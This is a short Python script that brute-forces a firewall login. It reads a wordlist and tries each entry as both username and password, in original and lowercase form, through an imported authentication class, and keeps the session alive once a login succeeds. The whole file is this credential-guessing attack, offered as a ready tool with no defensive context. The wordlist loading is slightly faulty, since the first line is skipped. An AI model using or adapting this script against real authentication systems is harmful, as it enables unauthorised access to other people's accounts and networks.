import authclass as auth
import sys
import requests
import os

with open("dict.txt") as fin:
    for line in fin:
        dictionary = fin.read().splitlines()

for roll in dictionary:
    authObj = auth.firewallAuth()
    os.system('clear')
    try:
        print('\rTrying :' + roll)
        if authObj.authenticate(roll,roll) is 1:
            authObj.keepalive()
            exit()
        if authObj.authenticate(roll.lower(),roll.lower()) is 1:
            authObj.keepalive()
            exit()
    except requests.exceptions.RequestException as e:
        print(e)
        exit()
